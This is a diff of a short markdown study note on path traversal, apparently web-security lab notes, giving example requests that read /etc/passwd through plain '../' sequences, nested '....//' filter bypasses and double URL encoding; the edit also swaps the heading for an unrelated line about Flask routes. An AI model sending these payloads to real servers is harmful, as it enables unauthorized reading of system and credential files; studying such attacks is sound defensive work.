@@ -1,4 +1,5 @@
-# path traversal
+
+how [[flask]] routes are defined.
 
 path/directory traversal enables an attacker to read files.
 
@@ -11,7 +12,7 @@ exploit: `GET /image?filename=../../../etc/passwd HTTP/2`
 
 ## bypass filters
 
-[getCanonicalName](72/getCanonicalName.java) checks for path traversal by looking at the
+[getCanonicalName](getCanonicalName.java) checks for path traversal by looking at the
 last slash character, depending whether it's windrows or Unix.
 
 ### traversal sequences are striped/blocked
@@ -25,7 +26,7 @@ last slash character, depending whether it's windrows or Unix.
 
    exploit: `GET /image?filename=....//....//....//etc/passwd HTTP/2`
 
-3. encode, double encode, non-standard encodings my also work.
+3. encode, double encode, non-standard encoding my also work.
 
   exploit: `GET
   /image?filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66etc/passwd
